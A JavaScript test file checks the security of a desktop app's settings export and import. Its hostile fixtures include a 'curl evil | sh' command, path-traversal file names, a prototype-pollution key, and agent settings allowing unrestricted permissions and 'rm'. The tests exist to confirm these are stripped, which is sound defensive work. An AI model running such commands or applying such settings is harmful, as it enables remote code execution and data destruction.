// @vitest-environment node
// Export and import of the settings (settingsBackup.js): what goes in the file, what
// never does, what a hostile file cannot do, and the two-step import (staged, then
// put in place at the next start, with the replaced files kept).
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { CATEGORIES, FORMAT, PENDING_DIR, BACKUPS_DIR, SENSITIVE_SETTINGS, buildBackup, inspectBackup, stageImport, hasPendingImport, applyPendingImport, layoutOk, withoutSecurity } from '../settingsBackup'

let dir
const put = (name, value) => fs.writeFileSync(path.join(dir, name), typeof value === 'string' ? value : JSON.stringify(value))
const read = (name) => fs.readFileSync(path.join(dir, name), 'utf8')

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'tessel-backup-'))
  put('workspace-layout.json', { version: 1, settings: { restoreWorkspaces: false }, workspaces: [{ name: 'proj' }] })
  put('remote-hosts.json', { version: 1, targets: [{ id: 'h1', host: 'example.org', username: 'u' }] })
  put('task-board.json', { version: 1, tasks: [{ id: 't1' }] })
  put('activity.json', [{ type: 'message' }])
  // secrets and machine-bound files that must never travel
  put('cli.token', 'SECRET-TOKEN')
  put('claude-plans.key', 'SECRET-KEY')
  put('liveshare-identity.json', { key: 'SECRET-IDENTITY' })
  put('liveshare-host.json', { sealed: 'SECRET-SEALED' })
  put('cookie-imports.json', { imports: [] })
  fs.mkdirSync(path.join(dir, 'claude-accounts'))
  fs.writeFileSync(path.join(dir, 'claude-accounts', 'accounts.json'), '{"secret":"SECRET-ACCOUNT"}')
})
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }))

describe('what an export holds', () => {
  it('the user\u2019s own setup, by category; files that are not there are just missing', () => {
    const { bundle, included, missing } = buildBackup({ dir, appVersion: '1.2.3', build: 'b9 (abc)', now: () => 42 })
    expect(bundle).toMatchObject({ app: 'tessel', format: FORMAT, createdAt: 42, appVersion: '1.2.3', build: 'b9 (abc)' })
    expect(Object.keys(bundle.files).sort()).toEqual(['activity.json', 'remote-hosts.json', 'task-board.json', 'workspace-layout.json'])
    expect(included.map((c) => c.id)).toEqual(['settings', 'hosts', 'board', 'activity'])
    expect(missing).toContain('chat-trust.json')
  })

  it('never a sign-in, a key, a token or an account folder', () => {
    const { bundle } = buildBackup({ dir })
    const all = JSON.stringify(bundle)
    for (const secret of ['SECRET-TOKEN', 'SECRET-KEY', 'SECRET-IDENTITY', 'SECRET-SEALED', 'SECRET-ACCOUNT']) expect(all).not.toContain(secret)
    const names = new Set(CATEGORIES.flatMap((c) => Object.keys(c.files)))
    for (const forbidden of ['cli.token', 'claude-plans.key', 'liveshare-identity.json', 'liveshare-host.json', 'cookie-imports.json', 'pty-host.token', 'provider-credentials']) expect(names.has(forbidden)).toBe(false)
  })

  it('only the chosen categories; a damaged or wrong-shaped file is left out, not exported as is', () => {
    put('task-board.json', '{ not json')
    put('activity.json', { not: 'an array' })
    const { bundle, included, missing } = buildBackup({ dir, categories: ['board', 'activity', 'settings'] })
    expect(Object.keys(bundle.files)).toEqual(['workspace-layout.json'])
    expect(included.map((c) => c.id)).toEqual(['settings'])
    expect(missing).toEqual(expect.arrayContaining(['task-board.json', 'activity.json']))
  })

  it('a symbolic link in the data folder is not followed into a backup', () => {
    fs.rmSync(path.join(dir, 'task-board.json'))
    const outside = path.join(os.tmpdir(), `tessel-outside-${process.pid}.json`)
    fs.writeFileSync(outside, '{"secret":"OUTSIDE"}')
    try {
      fs.symlinkSync(outside, path.join(dir, 'task-board.json'))
    } catch {
      fs.rmSync(outside, { force: true })
      return // no right to make a link here: nothing to check
    }
    const { bundle } = buildBackup({ dir })
    expect(JSON.stringify(bundle)).not.toContain('OUTSIDE')
    fs.rmSync(outside, { force: true })
  })
})

describe('reading a file the user picked', () => {
  const good = () => JSON.stringify(buildBackup({ dir }).bundle)

  it('what it holds, by category, with the date and the version that made it', () => {
    const { summary, files } = inspectBackup(good())
    expect(summary.categories.map((c) => c.id)).toEqual(['settings', 'hosts', 'board', 'activity'])
    expect(Object.keys(files)).toContain('workspace-layout.json')
  })

  it('refuses what is not a Tessel file, a newer format, and an empty one', () => {
    expect(() => inspectBackup('not json')).toThrowError(expect.objectContaining({ code: 'not-a-backup' }))
    expect(() => inspectBackup('{"app":"other","format":1,"files":{}}')).toThrowError(expect.objectContaining({ code: 'not-a-backup' }))
    expect(() => inspectBackup(JSON.stringify({ app: 'tessel', format: FORMAT + 1, files: {} }))).toThrowError(expect.objectContaining({ code: 'newer' }))
    expect(() => inspectBackup(JSON.stringify({ app: 'tessel', format: 1, files: {} }))).toThrowError(expect.objectContaining({ code: 'empty' }))
  })

  it('a hostile file: unknown names, paths, secrets files, wrong shapes and non-text are dropped, never written anywhere', () => {
    const hostile = JSON.stringify({
      app: 'tessel',
      format: 1,
      files: {
        '../evil.json': '{"x":1}',
        'cli.token': 'stolen',
        'liveshare-identity.json': '{"key":"k"}',
        'C:\\\\Windows\\\\x.json': '{}',
        'workspace-layout.json': '[1,2]', // wrong shape
        'remote-hosts.json': 42, // not text
        'task-board.json': '{"version":1,"tasks":[]}',
        __proto__: '{}'
      }
    })
    const { files, summary } = inspectBackup(hostile)
    expect(Object.keys(files)).toEqual(['task-board.json'])
    expect(summary.categories.map((c) => c.id)).toEqual(['board'])
  })
})

describe('the two-step import', () => {
  const bundleFiles = () => inspectBackup(JSON.stringify(buildBackup({ dir }).bundle)).files

  it('staging writes nothing over the live files and is not applied without its manifest', () => {
    const files = bundleFiles()
    put('workspace-layout.json', { version: 1, settings: { restoreWorkspaces: true } })
    expect(hasPendingImport(dir)).toBe(false)
    const r = stageImport({ dir, files, categories: ['settings'] })
    expect(r.count).toBe(1)
    expect(read('workspace-layout.json')).toContain('"restoreWorkspaces":true') // unchanged until the next start
    expect(hasPendingImport(dir)).toBe(true)
    // a staging cut short (no manifest) is dropped, not applied
    fs.rmSync(path.join(dir, PENDING_DIR, 'manifest.json'))
    expect(applyPendingImport({ dir })).toEqual({ applied: [], failed: [] })
    expect(fs.existsSync(path.join(dir, PENDING_DIR))).toBe(false)
    expect(read('workspace-layout.json')).toContain('"restoreWorkspaces":true')
  })

  it('at the next start the staged files replace the live ones; the replaced ones are kept, and its own safety copy stays (the fallback if a file is ever damaged)', () => {
    const files = bundleFiles() // restoreWorkspaces: false
    put('workspace-layout.json', { version: 1, settings: { restoreWorkspaces: true } })
    put('workspace-layout.json.bak', { version: 1, settings: { restoreWorkspaces: 'OLD-BAK' } })
    stageImport({ dir, files, categories: ['settings', 'board'] })
    const r = applyPendingImport({ dir, now: () => Date.UTC(2026, 10, 1, 12, 0, 0) })
    expect(r.applied.sort()).toEqual(['task-board.json', 'workspace-layout.json'])
    expect(r.failed).toEqual([])
    expect(JSON.parse(read('workspace-layout.json')).settings.restoreWorkspaces).toBe(false)
    expect(fs.existsSync(path.join(dir, 'workspace-layout.json.bak'))).toBe(true)
    const kept = fs.readdirSync(path.join(dir, BACKUPS_DIR))
    expect(kept).toHaveLength(1)
    expect(fs.readFileSync(path.join(dir, BACKUPS_DIR, kept[0], 'workspace-layout.json'), 'utf8')).toContain('"restoreWorkspaces":true')
    expect(fs.existsSync(path.join(dir, PENDING_DIR))).toBe(false)
    expect(fs.existsSync(path.join(dir, 'workspace-layout.json.import-tmp'))).toBe(false)
  })

  it('works on an empty data folder (the deleted-folder case)', () => {
    const files = bundleFiles()
    const fresh = fs.mkdtempSync(path.join(os.tmpdir(), 'tessel-fresh-'))
    try {
      stageImport({ dir: fresh, files, categories: ['settings', 'hosts', 'board', 'activity'] })
      const r = applyPendingImport({ dir: fresh })
      expect(r.failed).toEqual([])
      expect(JSON.parse(fs.readFileSync(path.join(fresh, 'remote-hosts.json'), 'utf8')).targets[0].host).toBe('example.org')
    } finally {
      fs.rmSync(fresh, { recursive: true, force: true })
    }
  })

  it('only chosen categories are staged; nothing chosen is refused; a tampered manifest or staged file cannot reach other paths', () => {
    const files = bundleFiles()
    stageImport({ dir, files, categories: ['board'] })
    expect(fs.readdirSync(path.join(dir, PENDING_DIR)).sort()).toEqual(['manifest.json', 'task-board.json'])
    expect(() => stageImport({ dir, files, categories: [] })).toThrowError(expect.objectContaining({ code: 'nothing-chosen' }))
    // a manifest naming other files, and a staged file of the wrong shape
    fs.writeFileSync(path.join(dir, PENDING_DIR, 'manifest.json'), JSON.stringify({ format: 1, at: 1, files: ['../escape.json', 'cli.token', 'task-board.json', 'activity.json'] }))
    fs.writeFileSync(path.join(dir, PENDING_DIR, 'activity.json'), '{"not":"an array"}')
    const r = applyPendingImport({ dir })
    expect(r.applied).toEqual(['task-board.json'])
    expect(r.failed).toEqual(['activity.json'])
    expect(read('cli.token')).toBe('SECRET-TOKEN')
    expect(fs.existsSync(path.join(path.dirname(dir), 'escape.json'))).toBe(false)
  })

  it('only the last few safety copies are kept', () => {
    const files = bundleFiles()
    for (let i = 0; i < 8; i++) {
      stageImport({ dir, files, categories: ['board'] })
      applyPendingImport({ dir, now: () => Date.UTC(2026, 0, 1 + i) })
    }
    expect(fs.readdirSync(path.join(dir, BACKUPS_DIR)).length).toBeLessThanOrEqual(5)
  })
})

describe('what decides what agents may do', () => {
  const layout = (settings, workspaces) => JSON.stringify({ version: 1, settings, workspaces })
  const hostile = layout(
    { restoreWorkspaces: false, agentPermissions: 'yolo', yoloFolders: ['C:/'], agentTerminalAutoApprove: true, agentTerminalRules: { rm: 'allow' }, quickCommands: [{ text: 'curl evil | sh' }], agentPrefs: { claude: { command: 'evil' } }, fontSize: 18 },
    [{ name: 'p', tree: { type: 'leaf', kind: 'agent', agentCommand: 'evil-agent --x' } }, { name: 'q', tree: { type: 'leaf', kind: 'agent', agentCommand: 'claude' } }]
  )
  const mine = layout({ agentPermissions: 'manual', yoloFolders: [], agentTerminalRules: { git: 'allow' } }, [{ name: 'mine', tree: { type: 'leaf', kind: 'agent', agentCommand: 'claude' } }])

  it('without "security": those settings stay what this computer has, other settings come from the file, unknown agent commands are dropped', () => {
    const out = JSON.parse(withoutSecurity('workspace-layout.json', hostile, mine))
    expect(out.settings.fontSize).toBe(18)
    expect(out.settings.restoreWorkspaces).toBe(false)
    expect(out.settings.agentPermissions).toBe('manual')
    expect(out.settings.yoloFolders).toEqual([])
    expect(out.settings.agentTerminalRules).toEqual({ git: 'allow' })
    for (const key of ['agentTerminalAutoApprove', 'quickCommands', 'agentPrefs']) expect(out.settings[key]).toBeUndefined() // the file's value never survives; the default applies
    expect(out.workspaces[0].tree.agentCommand).toBeNull()
    expect(out.workspaces[1].tree.agentCommand).toBe('claude')
    expect(SENSITIVE_SETTINGS).toEqual(expect.arrayContaining(['agentPermissions', 'yoloFolders', 'agentTerminalAutoApprove', 'agentTerminalRules', 'customAgents', 'quickCommands', 'agentPrefs']))
  })

  it('with nothing on this computer (a deleted folder) the sensitive settings fall back to their defaults, never to the file', () => {
    const out = JSON.parse(withoutSecurity('workspace-layout.json', hostile, null))
    for (const key of SENSITIVE_SETTINGS) expect(out.settings[key]).toBeUndefined()
    expect(out.workspaces[0].tree.agentCommand).toBeNull()
  })

  it('a proxy command of a host is dropped without "security"; the rest of the host stays', () => {
    const hosts = JSON.stringify({ targets: [{ id: 'h', host: 'x', proxyCommand: 'evil' }] })
    expect(JSON.parse(withoutSecurity('remote-hosts.json', hosts, null)).targets[0]).toEqual({ id: 'h', host: 'x' })
  })

  it('staging: without "security" nothing sensitive is staged; with it, the file is brought as it is', () => {
    put('workspace-layout.json', mine)
    const files = { 'workspace-layout.json': hostile, 'ssh-host-keys.json': '{"keys":{}}' }
    stageImport({ dir, files, categories: ['settings'] })
    expect(JSON.parse(fs.readFileSync(path.join(dir, PENDING_DIR, 'workspace-layout.json'), 'utf8')).settings.agentPermissions).toBe('manual')
    stageImport({ dir, files, categories: ['settings', 'security'] })
    expect(JSON.parse(fs.readFileSync(path.join(dir, PENDING_DIR, 'workspace-layout.json'), 'utf8')).settings.agentPermissions).toBe('yolo')
    expect(fs.existsSync(path.join(dir, PENDING_DIR, 'ssh-host-keys.json'))).toBe(true)
    // host keys, trusted guests and trusted folders are in the security part, not in the others
    expect(CATEGORIES.find((c) => c.id === 'security').files).toHaveProperty('liveshare-trusted.json')
    expect(CATEGORIES.find((c) => c.id === 'hosts').files).not.toHaveProperty('ssh-host-keys.json')
  })

  it('the environment variables of agents (API keys) are never exported', () => {
    put('workspace-layout.json', layout({ agentPrefs: { claude: { command: 'claude', env: 'ANTHROPIC_API_KEY=sk-SECRET' }, codex: { env: 'TOKEN=SECRET2' } }, fontSize: 14 }, []))
    const { bundle } = buildBackup({ dir, categories: ['settings'] })
    const text = bundle.files['workspace-layout.json']
    expect(text).not.toContain('SECRET')
    expect(JSON.parse(text).settings.agentPrefs.claude).toEqual({ command: 'claude' })
    expect(JSON.parse(text).settings.fontSize).toBe(14)
  })
})

describe('a layout that would break the start', () => {
  it('is refused when the file is read, not found out at the next start', () => {
    expect(layoutOk({ workspaces: [null] })).toBe(false)
    expect(layoutOk({ workspaces: [{ tree: 'x' }] })).toBe(false)
    expect(layoutOk({ workspaces: 'x' })).toBe(false)
    expect(layoutOk({ settings: [] })).toBe(false)
    expect(layoutOk({ workspaces: [{ name: 'a', tree: null }, { name: 'b', tree: { type: 'leaf' } }] })).toBe(true)
    const bad = JSON.stringify({ app: 'tessel', format: 1, files: { 'workspace-layout.json': '{"workspaces":[null]}', 'task-board.json': '{"tasks":[]}' } })
    expect(Object.keys(inspectBackup(bad).files)).toEqual(['task-board.json'])
  })
})

describe('putting the files in place, carefully', () => {
  const stage = (names = ['board']) => {
    const files = { 'task-board.json': '{"version":1,"tasks":[{"id":"new"}]}', 'activity.json': '[]' }
    stageImport({ dir, files, categories: names })
  }
  it('applied once: the manifest is consumed first, so a second start does not apply it again', () => {
    stage()
    const first = applyPendingImport({ dir, now: () => 1000 })
    expect(first.applied).toEqual(['task-board.json'])
    expect(applyPendingImport({ dir, now: () => 2000 })).toEqual({ applied: [], failed: [] })
    expect(fs.readdirSync(path.join(dir, BACKUPS_DIR))).toHaveLength(1)
  })

  it('a file that cannot be put in place stays staged for the next start, the others are applied', () => {
    const files = { 'task-board.json': '{"tasks":[]}', 'activity.json': '[]' }
    stageImport({ dir, files, categories: ['board', 'activity'] })
    fs.writeFileSync(path.join(dir, PENDING_DIR, 'activity.json'), '{"not":"an array"}') // fails its check
    const r = applyPendingImport({ dir })
    expect(r.applied).toEqual(['task-board.json'])
    expect(r.failed).toEqual(['activity.json'])
    expect(hasPendingImport(dir)).toBe(true)
    expect(JSON.parse(fs.readFileSync(path.join(dir, PENDING_DIR, 'manifest.json'), 'utf8')).files).toEqual(['activity.json'])
  })

  it('a name twice in the manifest is applied once, so the safety copy stays the real original', () => {
    stage()
    fs.writeFileSync(path.join(dir, PENDING_DIR, 'manifest.json'), JSON.stringify({ format: 1, at: 1, files: ['task-board.json', 'task-board.json'] }))
    const r = applyPendingImport({ dir, now: () => 5000 })
    expect(r.applied).toEqual(['task-board.json'])
    const kept = fs.readdirSync(path.join(dir, BACKUPS_DIR))
    expect(fs.readFileSync(path.join(dir, BACKUPS_DIR, kept[0], 'task-board.json'), 'utf8')).toContain('"t1"')
  })

  it('a link where the staging goes is not followed', () => {
    const outside = fs.mkdtempSync(path.join(os.tmpdir(), 'tessel-link-'))
    try {
      try {
        fs.symlinkSync(outside, path.join(dir, PENDING_DIR), 'junction')
      } catch {
        return // no right to make a link here: nothing to check
      }
      expect(() => stageImport({ dir, files: { 'task-board.json': '{}' }, categories: ['board'] })).toThrow()
      expect(fs.readdirSync(outside)).toEqual([])
    } finally {
      fs.rmSync(outside, { recursive: true, force: true })
    }
  })

  it('one file too big for a backup is left out and listed, the rest is exported', () => {
    const big = path.join(dir, 'activity.json')
    fs.writeFileSync(big, '[' + '0,'.repeat(21 * 1024 * 1024) + '0]') // over 40 MB
    const { bundle, missing } = buildBackup({ dir, categories: ['settings', 'activity'] })
    expect(Object.keys(bundle.files)).toEqual(['workspace-layout.json'])
    expect(missing).toContain('activity.json')
  })
})
